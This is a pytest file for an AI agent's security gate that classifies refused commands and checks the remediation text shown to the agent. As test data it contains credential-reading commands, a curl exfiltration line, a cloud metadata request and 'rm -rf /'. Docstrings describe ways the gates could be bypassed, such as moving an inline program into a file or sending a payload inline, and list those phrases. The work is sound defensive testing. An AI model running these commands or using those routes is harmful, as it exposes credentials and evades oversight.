"""Deny-class classification and the remediation text attached to a refusal.

The classifier reads anchor phrases out of refusal text, so the tests that matter
drive the REAL producers in :mod:`kiro_crew.security` rather than asserting on
copied strings. A pinned copy would keep passing after the producer reworded
itself, which is the exact failure this guards: the refusal would silently lose
its guidance and nothing would go red.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest

from kiro_crew import deny_guidance as dg
from kiro_crew import security
from kiro_crew.dashboard.state import (
    DENY_CAUSE_HOOK_ERROR,
    DENY_CAUSE_INVALID_NAME,
    DENY_CAUSE_POLICY,
    build_refusal_recovery_prompt,
    build_refusal_steer_notice,
)


def _builtin_regexes() -> list[str]:
    return security.compute_effective_denied(security.BUILTIN_DENIED_RULES, (), False, (), ())


def _home(*parts: str) -> str:
    return str(Path.home().joinpath(*parts))


class TestClassifyAgainstRealProducers:
    """Every class is reached through the function that actually refuses."""

    @pytest.mark.parametrize(
        "relative,expected",
        [
            ((".aws", "credentials"), dg.DENY_CLASS_AWS_CREDENTIAL),
            ((".aws", "sso", "cache", "token.json"), dg.DENY_CLASS_SSO_CREDENTIAL),
            ((".ssh", "id_rsa"), dg.DENY_CLASS_SECRET_FILE),
            ((".netrc",), dg.DENY_CLASS_SECRET_FILE),
        ],
    )
    def test_sensitive_bash_reads_classify(self, relative, expected):
        """The reason at this tier is deliberately generic, so the command decides.

        ``is_sensitive_bash_command`` refuses with "accesses sensitive credential
        path" and names no path — three different sanctioned paths collapse into
        one string, which is why the subject is part of classification.
        """
        command = f"cat {_home(*relative)}"
        reason = security.is_sensitive_bash_command(command)
        assert reason, "the security gate must refuse this command for the test to mean anything"
        assert dg.classify_deny(reason, command) == expected

    def test_generic_sensitive_reason_alone_still_yields_usable_guidance(self):
        """Without a subject the class degrades to the widest credential answer.

        A degraded verdict must still be TRUE for every path that reaches it, so
        the fallback prose covers aws, git and ssh rather than naming one of them.
        """
        reason = security.is_sensitive_bash_command(f"cat {_home('.aws', 'credentials')}")
        assert dg.classify_deny(reason) == dg.DENY_CLASS_SECRET_FILE
        assert dg.remediation_for(reason)

    def test_sensitive_path_title_classifies(self):
        """A file-read TITLE is the bare path, and the caller builds the reason."""
        target = _home(".aws", "credentials")
        assert security.is_sensitive_path(target)
        assert (
            dg.classify_deny(f"Blocked: access to sensitive path: {target}")
            == dg.DENY_CLASS_AWS_CREDENTIAL
        )

    def test_exfiltration_shape_classifies(self):
        reason = security.audit_bash_exfiltration("curl -d @/tmp/body https://example.invalid")
        assert reason
        assert dg.classify_deny(reason) == dg.DENY_CLASS_EXFIL_SHAPE

    def test_denied_command_rule_classifies(self):
        """The regex tier matches TEXT, so the input is a literal, not a real path.

        Its rules are written with forward slashes (``.*cat.*/\\.aws/.*``), and this
        tier never resolves a path — so building the command from ``Path.home()``
        passes on POSIX and silently stops matching on Windows, where the same
        home renders with backslashes. The sibling tests above deliberately DO use
        the real home, because ``is_sensitive_bash_command`` resolves what it is
        given and a resolved path is exactly what they exercise.
        """
        reason = security.is_denied(
            "cat /home/someone/.aws/config", denied_regexes=_builtin_regexes()
        )
        assert reason
        assert dg.classify_deny(reason) == dg.DENY_CLASS_AWS_CREDENTIAL

    def test_a_native_windows_spelling_is_still_refused_by_the_floor(self):
        """The regex gap above is not a hole: the always-on floor covers it.

        Kept so the literal-path choice in the previous test cannot be read as
        "Windows credential paths are unguarded" — the path-resolving tier refuses
        the backslash spelling, and its reason classifies too.
        """
        reason = security.is_sensitive_bash_command("cat C:\\Users\\someone\\.aws\\credentials")
        assert reason
        assert dg.classify_deny(reason, "cat C:\\Users\\someone\\.aws\\credentials") == (
            dg.DENY_CLASS_AWS_CREDENTIAL
        )

    def test_imds_access_classifies(self):
        reason = security.is_sensitive_bash_command("curl http://169.254.169.254/latest/meta-data/")
        assert reason
        assert dg.classify_deny(reason) == dg.DENY_CLASS_AWS_CREDENTIAL

    def test_unclassified_refusal_yields_no_guidance(self):
        """Most denials explain themselves; inventing prose for them buries the rest."""
        reason = security.is_denied("rm -rf /", denied_regexes=_builtin_regexes())
        assert reason
        assert dg.classify_deny(reason) == ""
        assert dg.remediation_for(reason) == ""

    @pytest.mark.parametrize("reason", ["", "   ", None])
    def test_blank_reason_is_unclassified(self, reason):
        assert dg.classify_deny(reason) == ""


class TestRemediationText:
    def test_every_class_has_text(self):
        classes = {name for name, _anchors in dg._CLASS_ANCHORS}
        assert classes == set(dg.REMEDIATION)
        assert all(text.strip() for text in dg.REMEDIATION.values())

    def test_no_remediation_can_forge_a_deny_pattern_line(self):
        """The notice is parsed per-line for the deny marker.

        ``RecoveryCard.tsx`` collects patterns with a global, per-line regex, so
        remediation prose carrying the marker would render as a second, fabricated
        rule for the reader to go audit.
        """
        for text in dg.REMEDIATION.values():
            assert security.DENY_REASON_MATCH_PREFIX not in text

    def test_no_remediation_offers_a_route_around_its_own_rule(self):
        """Guidance may name the sanctioned path; it may never name a bypass.

        Swept across EVERY class rather than one, because this has now been the
        finding twice on two different classes — first the self-protection floor,
        which matches an INLINE program importing the product (``-c``, a stdin
        program, ``-m``) but not a positional script path, so "put it in a file"
        handed over the one spelling the gate does not cover; then the
        exfiltration shape, which matches a request that REFERENCES a local file
        but not one carrying the same bytes literally, so "send the payload
        inline" handed over the bypass on the rule's whole reason for existing.
        A per-class guard would have caught neither the second time.

        The prose is steered in-band and may be read by an agent acting on
        injected content, so it has to fail safe: no remediation re-runs the
        refused action by another route. Phrases are specific spellings rather
        than bare words like "instead", which several classes use legitimately
        while pointing AT the sanctioned path.
        """
        bypass_phrases = (
            # Relocating an inline program into a file (self-protection).
            "script file",
            "in a file",
            "into a file",
            "run that file",
            "$KIROCREW_SCRATCH",
            "another interpreter and run",
            # Carrying a file's bytes in the body instead of referencing it (exfil).
            "inline instead",
            "payload inline",
            "send it inline",
            "paste the contents",
            "$(cat",
            "command substitution",
            # Phrase forms, not the bare tool name: `base64` legitimately appears
            # in the list of readers that are ALSO blocked, which is the opposite
            # of a bypass.
            "base64 it",
            "base64-encode",
            "base64 the",
        )
        for deny_class, text in dg.REMEDIATION.items():
            lowered = text.lower()
            for phrase in bypass_phrases:
                assert (
                    phrase.lower() not in lowered
                ), f"{deny_class} guidance names a bypass: {phrase}"
        # Swept on the OTHER two channels as well. The bypass sentence this test
        # was extended for lived in BOTH the dict and the skill, so a sweep of the
        # dict alone would have declared it fixed while the trigger-loaded copy
        # still taught it.
        root = Path(__file__).resolve().parents[1] / "src" / "kiro_crew"
        surfaces = {
            "blocked-by-policy/SKILL.md": (
                root / "builtin_skills" / "blocked-by-policy" / "SKILL.md"
            ),
            "docs/blocked-commands.md": root / "docs" / "blocked-commands.md",
        }
        for label, path in surfaces.items():
            lowered = path.read_text(encoding="utf-8").lower()
            for phrase in bypass_phrases:
                assert phrase.lower() not in lowered, f"{label} names a bypass: {phrase}"

    def test_a_class_with_no_sanctioned_command_offers_no_example(self):
        """An "example" for an intent-based refusal IS an alternative spelling.

        The trust root, the self-protection floor and the exfiltration shape
        cannot be satisfied by running something else, so a pinned command for
        one of them could only be a way to redo the refused action.
        """
        assert set(dg.SUGGESTED_COMMANDS) == {dg.DENY_CLASS_AWS_CREDENTIAL}
        for deny_class in (
            dg.DENY_CLASS_TRUST_ROOT,
            dg.DENY_CLASS_SELF_PROTECTION,
            dg.DENY_CLASS_EXFIL_SHAPE,
        ):
            assert deny_class not in dg.SUGGESTED_COMMANDS

    def test_exfil_guidance_hands_the_step_back(self):
        """Removing the bypass must leave a usable instruction, not a dead end."""
        text = dg.REMEDIATION[dg.DENY_CLASS_EXFIL_SHAPE].lower()
        assert "let the user" in text
        assert "must not be" in text

    def test_self_protection_hands_the_step_back_instead(self):
        """Removing the bypass must leave a usable instruction, not a dead end."""
        text = dg.REMEDIATION[dg.DENY_CLASS_SELF_PROTECTION].lower()
        assert "let the user" in text
        assert "must not be re-spelled" in text

    @pytest.mark.parametrize(
        "subject",
        [
            "Running: python -m processor --all",
            "Running: rm -rf ~/.kiro/crew/lessons.json",
            "Running: grep associated ./notes.txt",
        ],
    )
    def test_short_anchors_do_not_match_inside_a_word(self, subject):
        """ "sso" lives inside processor/lessons/associated, and SSO outranks the
        widest credential class — so a bare substring test answered unrelated
        refusals with enterprise-SSO prose."""
        assert dg.classify_deny("Blocked by security policy", subject) != (
            dg.DENY_CLASS_SSO_CREDENTIAL
        )

    @pytest.mark.parametrize(
        "subject",
        [
            "Running: cat ~/.aws/sso/cache/abc.json",
            "Running: aws sso login",
        ],
    )
    def test_real_sso_paths_still_classify(self, subject):
        """The boundary must not cost the matches the anchor exists for."""
        assert dg.classify_deny("Blocked: accesses sensitive credential path", subject) == (
            dg.DENY_CLASS_SSO_CREDENTIAL
        )

    def test_suggested_commands_are_themselves_allowed(self):
        """Guidance must not walk the agent into a second wall.

        Advice that is itself denied costs a turn and teaches the model that the
        host's own instructions are untrustworthy, which is worse than silence.
        """
        regexes = _builtin_regexes()
        for deny_class, commands in dg.SUGGESTED_COMMANDS.items():
            for command in commands:
                assert not security.is_denied(
                    command, denied_regexes=regexes
                ), f"{deny_class} suggests a denied command: {command}"
                assert not security.is_sensitive_bash_command(
                    command
                ), f"{deny_class} suggests a sensitive-path command: {command}"
                assert not security.audit_bash_exfiltration(
                    command
                ), f"{deny_class} suggests an exfiltration-shaped command: {command}"

    def test_suggested_commands_appear_in_their_own_prose(self):
        """Otherwise the pinned command drifts away from what the text tells the agent."""
        for deny_class, commands in dg.SUGGESTED_COMMANDS.items():
            for command in commands:
                assert command in dg.REMEDIATION[deny_class]

    def test_the_other_two_surfaces_quote_the_same_commands(self):
        """The sanctioned path is stated in three places, so pin all three.

        `REMEDIATION` is what the refusal says, the skill is what a triggered
        agent reads, and the user doc is what a human reads. Only the dict was
        pinned, so a change to the sanctioned AWS command drifted silently in the
        other two — and a command either of them quotes could itself be denied,
        which is the same "second wall" the sibling test exists to prevent.

        Scoped to the credential class on purpose: `exfil_shape`'s entry is an
        ILLUSTRATION of a refused shape, not a command to run, so requiring the
        other surfaces to reproduce it would pin the wrong thing.
        """
        root = Path(__file__).resolve().parents[1] / "src" / "kiro_crew"
        surfaces = {
            "builtin_skills/blocked-by-policy/SKILL.md": (
                root / "builtin_skills" / "blocked-by-policy" / "SKILL.md"
            ),
            "docs/blocked-commands.md": root / "docs" / "blocked-commands.md",
        }
        regexes = _builtin_regexes()
        sanctioned = dg.SUGGESTED_COMMANDS[dg.DENY_CLASS_AWS_CREDENTIAL]
        for label, path in surfaces.items():
            text = path.read_text(encoding="utf-8")
            for command in sanctioned:
                assert command in text, f"{label} does not quote the sanctioned {command!r}"
            quoted = set(re.findall(r"`((?:aws|git|ssh) [a-z0-9 _.-]+)`", text))
            assert quoted, f"{label} quotes no command at all — the sweep would be vacuous"
            for command in quoted:
                assert not security.is_denied(
                    command, denied_regexes=regexes
                ), f"{label} suggests a denied command: {command}"
                assert not security.is_sensitive_bash_command(
                    command
                ), f"{label} suggests a sensitive-path command: {command}"


class TestCredentialToolHint:
    def test_names_a_credential_vending_server(self):
        hint = dg.credential_tool_hint(
            [
                {"server_id": "creds-agent", "title": "Creds Agent", "description": ""},
                {"server_id": "note-taker", "title": "Notes", "description": "write notes"},
            ]
        )
        assert "creds-agent" in hint
        assert "note-taker" not in hint

    @pytest.mark.parametrize(
        "description",
        ["posts messages to a channel", "renders williams charts", "custom instruments"],
    )
    def test_a_keyword_inside_an_unrelated_word_does_not_match(self, description):
        """ "sts" lives inside "posts", "iam" inside "williams", "sts" inside
        "instruments" — a bare substring test recommended those servers as
        credential vendors, which is advice the agent cannot act on."""
        assert dg.credential_tool_hint(
            [{"server_id": "note-taker", "description": description}]
        ) == ("")

    @pytest.mark.parametrize(
        "row",
        [
            {"server_id": "creds-agent"},
            {"server_id": "sso-helper"},
            {"server_id": "x", "description": "vends STS session credentials"},
            {"server_id": "y", "description": "assume an IAM role"},
        ],
    )
    def test_real_vendors_still_match(self, row):
        """The boundary must not cost the matches the keywords exist for."""
        assert dg.credential_tool_hint([row])

    def test_matches_on_description_not_only_id(self):
        hint = dg.credential_tool_hint(
            [{"server_id": "vend-1", "description": "vends AWS STS credentials"}]
        )
        assert "vend-1" in hint

    @pytest.mark.parametrize("rows", [[], None, [{"server_id": ""}], ["not-a-mapping"]])
    def test_no_match_is_empty(self, rows):
        assert dg.credential_tool_hint(rows) == ""

    def test_rows_are_deduplicated_and_ordered(self):
        hint = dg.credential_tool_hint(
            [
                {"server_id": "sso-b"},
                {"server_id": "creds-a"},
                {"server_id": "sso-b"},
            ]
        )
        assert hint.count("sso-b") == 1
        assert hint.index("creds-a") < hint.index("sso-b")

    def test_hint_only_reaches_the_classes_a_vendor_can_answer(self):
        hint = dg.credential_tool_hint([{"server_id": "creds-agent"}])
        assert hint
        aws = dg.remediation_for(
            "Blocked: command accesses sensitive credential path (.aws/credentials)",
            credential_tool_hint=hint,
        )
        trust = dg.remediation_for(
            "Blocked: command extracts into the governance trust-root directory",
            credential_tool_hint=hint,
        )
        assert "creds-agent" in aws
        assert "creds-agent" not in trust


@pytest.mark.asyncio
class TestResolveHintOnThePublicEdition:
    async def test_unavailable_manager_yields_no_hint_and_caches(self, monkeypatch):
        dg.reset_credential_tool_hint_cache()
        calls: list[int] = []

        class _Manager:
            def available(self) -> bool:
                calls.append(1)
                return False

            async def list_mcp(self):  # pragma: no cover - must not be reached
                raise AssertionError("list_mcp must not run when available() is False")

        monkeypatch.setattr(dg, "_HINT_TTL_SECS", 300.0)
        import kiro_crew.platform.context as ctx_mod

        monkeypatch.setattr(ctx_mod, "safe_context_call", lambda fn, **kw: _Manager(), raising=True)
        assert await dg.resolve_credential_tool_hint() == ""
        assert await dg.resolve_credential_tool_hint() == ""
        assert len(calls) == 1, "the second call must be served from the cache"
        dg.reset_credential_tool_hint_cache()

    async def test_available_manager_yields_the_vendor_hint_and_caches_it(self, monkeypatch):
        """The non-empty branch, which only a composed edition reaches at runtime.

        `DefaultCapabilityManager.available()` is False in this repo, so without
        this case the whole hint path would ship with its productive half never
        executed in-tree.
        """
        dg.reset_credential_tool_hint_cache()
        calls: list[int] = []

        class _Manager:
            def available(self) -> bool:
                return True

            async def list_mcp(self):
                calls.append(1)
                return [{"server_id": "creds-agent", "description": "vends AWS credentials"}]

        monkeypatch.setattr(dg, "_HINT_TTL_SECS", 300.0)
        monkeypatch.setattr(
            dg.platform_context, "safe_context_call", lambda fn, **kw: _Manager(), raising=True
        )
        hint = await dg.resolve_credential_tool_hint()
        assert "creds-agent" in hint
        assert await dg.resolve_credential_tool_hint() == hint
        assert len(calls) == 1, "the second call must be served from the cache"
        dg.reset_credential_tool_hint_cache()

    async def test_lookup_failure_degrades_to_no_hint(self, monkeypatch):
        dg.reset_credential_tool_hint_cache()
        import kiro_crew.platform.context as ctx_mod

        def _boom(fn, **kw):
            raise RuntimeError("composition exploded")

        monkeypatch.setattr(ctx_mod, "safe_context_call", _boom, raising=True)
        assert await dg.resolve_credential_tool_hint() == ""
        dg.reset_credential_tool_hint_cache()


class TestNoticeIntegration:
    _AWS_REASON = "Blocked: command accesses sensitive credential path (.aws/credentials)"

    def test_policy_notice_carries_the_remediation(self):
        notice = build_refusal_steer_notice("Running: cat creds", self._AWS_REASON)
        assert "How to do this properly:" in notice
        assert "aws configure list-profiles" in notice

    @pytest.mark.parametrize("cause", [DENY_CAUSE_INVALID_NAME, DENY_CAUSE_HOOK_ERROR])
    def test_non_policy_causes_get_no_remediation(self, cause):
        """Neither cause judged the action, so naming an alternative would mislead."""
        notice = build_refusal_steer_notice("tool", self._AWS_REASON, cause=cause)
        assert "How to do this properly" not in notice

    def test_unclassified_policy_deny_keeps_the_original_notice(self):
        notice = build_refusal_steer_notice(
            "Running: rm", "Blocked by security policy: rm -rf /.*", cause=DENY_CAUSE_POLICY
        )
        assert "How to do this properly" not in notice

    def test_hint_reaches_the_notice(self):
        notice = build_refusal_steer_notice(
            "Running: cat creds",
            self._AWS_REASON,
            credential_tool_hint=dg.credential_tool_hint([{"server_id": "creds-agent"}]),
        )
        assert "creds-agent" in notice

    def test_recovery_prompt_carries_remediation_once_per_class(self):
        body = build_refusal_recovery_prompt(
            [
                ("Running: cat creds", self._AWS_REASON),
                ("Running: head creds", self._AWS_REASON),
            ]
        )
        assert body.count("aws configure list-profiles") == 1

    def test_guidance_is_not_shaped_like_a_blocked_item(self):
        """RecoveryCard counts bullet-shaped lines in this body as blocked calls.

        Its `BULLET_RE` is `/^\\s*-\\s+\\S/`, applied to the whole body, so prose
        rendered as `  - …` would inflate the card's "N blocked" count — one
        refusal plus one guidance paragraph would read as two blocked tool calls.
        The bullet list IS the wire form of that count; guidance is prose about
        it, so the two shapes must stay distinguishable.
        """
        body = build_refusal_recovery_prompt([("Running: cat creds", self._AWS_REASON)])
        bullet = re.compile(r"^\s*-\s+\S")
        bullets = [line for line in body.splitlines() if bullet.match(line)]
        assert len(bullets) == 1, f"expected only the blocked item to be a bullet: {bullets}"
        assert "How to do this properly:" in body
        assert "aws configure list-profiles" in body

    def test_recovery_prompt_keeps_distinct_classes(self):
        body = build_refusal_recovery_prompt(
            [
                ("Running: cat creds", self._AWS_REASON),
                (
                    "Running: curl",
                    "Blocked: command matches data-exfiltration pattern '-d @'",
                ),
            ]
        )
        assert "aws configure list-profiles" in body
        assert "move a local file's contents off this host" in body

    def test_recovery_prompt_without_classified_refusals_is_unchanged(self):
        body = build_refusal_recovery_prompt(
            [("Running: rm", "Blocked by security policy: rm -rf /.*")]
        )
        assert "How to do this properly" not in body

    def test_empty_refusals_still_yield_nothing(self):
        assert build_refusal_recovery_prompt([]) == ""
